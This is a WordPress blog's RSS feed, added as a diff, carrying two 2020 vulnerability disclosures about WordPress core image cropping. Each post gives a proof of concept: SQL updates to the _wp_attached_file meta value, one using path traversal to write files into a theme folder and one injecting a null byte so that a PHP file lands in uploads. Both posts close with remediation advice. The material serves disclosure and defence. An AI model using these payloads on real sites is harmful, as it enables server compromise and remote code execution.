@@ -1,0 +1,177 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>WP deeply</title>
+	<atom:link href="https://wpdeeply.com/feed/" rel="self" type="application/rss+xml" />
+	<link>http://wpdeeply.com/</link>
+	<description></description>
+	<lastBuildDate>Sun, 12 Jul 2020 20:27:44 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.4.2</generator>
+	<item>
+		<title>WordPress write image to any directory RCE</title>
+		<link>https://wpdeeply.com/2020/07/12/wordpress-write-image-to-any-directory-rce/</link>
+		
+		<dc:creator><![CDATA[root]]></dc:creator>
+		<pubDate>Sun, 12 Jul 2020 20:27:43 +0000</pubDate>
+				<category><![CDATA[core]]></category>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=131</guid>
+
+					<description><![CDATA[Image cropping in WordPress is sort of unlucky, specially derivation of final image path ( file system or http/s location ), where image will be loaded from the path, but decisions for additional directories creation and final path (no traversal prevention here) are taken from&#160;_wp_attached_file. Those issues are subject for deeper observation and debugging which [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<hr class="wp-block-separator"/>
+
+
+
+<p>Image cropping in WordPress is sort of unlucky, specially derivation of final image path ( file system or http/s location ), where image will be loaded from the path, but decisions for additional directories creation and final path (no traversal prevention here) are taken from&nbsp;<code>_wp_attached_file</code>. Those issues are subject for deeper observation and debugging which will happen in the very near future, for now we need to get another conclusion.</p>
+
+
+
+<h2 id="eli5-poc">Eli5 PoC</h2>
+
+
+
+<ul><li>Upload image to your local WP and name it wpdeeply.png (in order to be able to use copy paste from here in next steps)</li><li>Get attachment_id (post_id of the image)</li><li>Enable hello.php plugin and add this code at the end of the file</li></ul>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">function wprcedemo(){
+    
+    //add your attachment_id here - mine is 77
+    $attachment_id = 77;
+    
+    if ( ! function_exists( 'wp_crop_image' ) ) {
+        include ABSPATH . 'wp-admin/includes/image.php';
+    }
+
+    wp_crop_image($attachment_id, 0, 0, 300, 300, 300, 300);
+    
+    exit("good :)");
+}
+
+add_action("init", "wprcedemo");
+
+</code></pre>
+
+
+
+<ul><li>Open mysql administration tool and execute following query</li></ul>
+
+
+
+<pre class="wp-block-code"><code lang="sql" class="language-sql">UPDATE `wp_postmeta` SET `meta_value` =  concat('2020/07/wpdeeply.png#/','boom.png' ) WHERE `wp_postmeta`.`meta_key` = '_wp_attached_file' and `wp_postmeta`.`post_id` = 77
+</code></pre>
+
+
+
+<ul><li>Refresh the home page (good <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> should be printed) and under&nbsp;<code>2020/07</code>&nbsp;there should be new directory&nbsp;<code>wpdeeply.png#</code></li><li>Open mysql administration tool and execute following query</li></ul>
+
+
+
+<pre class="wp-block-code"><code lang="sql" class="language-sql">UPDATE `wp_postmeta` SET `meta_value` = concat('2020/07/wpdeeply.png#/../../../../themes/twentytwenty/boom.png' ) WHERE `wp_postmeta`.`meta_key` = '_wp_attached_file' and `wp_postmeta`.`post_id` = 77
+</code></pre>
+
+
+
+<ul><li>Refresh the home page (good <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> should be printed) and under&nbsp;<code>twentytwenty</code>&nbsp;theme should be&nbsp;<code>cropped-boom.png</code>&nbsp;file</li><li><code>_wp_page_template</code>&nbsp;meta_value away from RCE</li></ul>
+
+
+
+<h2 id="few-facts">Few facts</h2>
+
+
+
+<ul><li>WordPress allows files with valid image extension and any content in it (not complete security patches from the past)</li><li>This bug is also part of not complete security patch in the past</li><li><code>_wp_attached_file</code>&nbsp;value becomes holy grail of WordPress security and still there are ways to interfere with it (via core)</li><li>WP core via its site-health push users to install/configure WP in that way so core files are writable by web server</li></ul>
+
+
+
+<h2 id="remediation">Remediation</h2>
+
+
+
+<ul><li>Core files shouldn’t be writable by www-data user</li><li>Theme files shouldn’t be writable by www-data user too</li><li>Turn automatic updates for WP core, plugins, themes OFF</li></ul>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>WordPress null byte to RCE &#8211; 0 day bug</title>
+		<link>https://wpdeeply.com/2020/07/12/wordpress-null-byte-to-rce-0-day-bug/</link>
+		
+		<dc:creator><![CDATA[root]]></dc:creator>
+		<pubDate>Sun, 12 Jul 2020 20:21:46 +0000</pubDate>
+				<category><![CDATA[core]]></category>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=124</guid>
+
+					<description><![CDATA[It is common knowledge that non binary safe functions in PHP should be avoided e.g. to be replaced from legacy code with binary safe alternatives. What we have in the WP core&#160;class-wp-image-editor-imagick and we all know that PHP imagick prefers writeImageFile before writeImage because it is binary safe. What does this mean? This means if WP uses class-wp-image-editor-imagick as default image [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<hr class="wp-block-separator"/>
+
+
+
+<p>It is common knowledge that non binary safe functions in PHP should be avoided e.g. to be replaced from legacy code with binary safe alternatives.</p>
+
+
+
+<p>What we have in the WP core&nbsp;<code>class-wp-image-editor-imagick</code></p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">$this->make_image( $filename, array( $image, 'writeImage' ), array( $filename ) );
+</code></pre>
+
+
+
+<p>and we all know that PHP imagick prefers <code>writeImageFile</code> before <code>writeImage</code> because it is binary safe. What does this mean? This means if WP uses <code>class-wp-image-editor-imagick</code> as default image editing engine we can salute our RCE because we are null byte away from it when <code>save</code> e.g. <code>_save</code> method is called.</p>
+
+
+
+<h2 id="eli5-poc">Eli5 PoC</h2>
+
+
+
+<ul><li>upload media file to your local WP called “nullbyte.jpg”</li><li>get its post id ( mine is 91 )</li><li>open mysql administration tool and issue following query:</li></ul>
+
+
+
+<pre class="wp-block-code"><code lang="sql" class="language-sql">UPDATE `wp_postmeta` SET `meta_value` = concat('2020/07/nullbyte.jpg#','/go.php',char(0),'.gif' ) WHERE `wp_postmeta`.`post_id` = 91 and `wp_postmeta`.`meta_key` = '_wp_attached_file'
+</code></pre>
+
+
+
+<ul><li>go to media library, crop image + save</li><li>navigate to https://wp.local/wp-content/uploads/2020/07/nullbyte.jpg%23/go.php</li></ul>
+
+
+
+<h2 id="few-facts">Few facts</h2>
+
+
+
+<ul><li>Images manipulated with PHP Imagick will hold their old meta data (php shells / code will remain intact)</li><li>WP core had put a lot of efforts to protect <code>_wp_attached_file</code> meta value, but it is bypassable (next days disclosure)</li><li>WP in 5.5 via its site-health will warn users that they need to use ImageMagic on their servers :/</li><li>WP core via its site-health push users to install/configure WP in that way so core files are writable by web server</li><li>have you ever heard about <a href="https://github.com/Slavco/wp-weaver">https://github.com/Slavco/wp-weaver</a> <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li><li>there are few another attack vectors than described above</li></ul>
+
+
+
+<h2 id="remediation">Remediation</h2>
+
+
+
+<ul><li>uploads dir shouldn’t be able to run PHP code</li><li>core files shouldn’t be writable by www-data user</li></ul>
+]]></content:encoded>
+					
+		
+		
+			</item>
+	</channel>
+</rss>
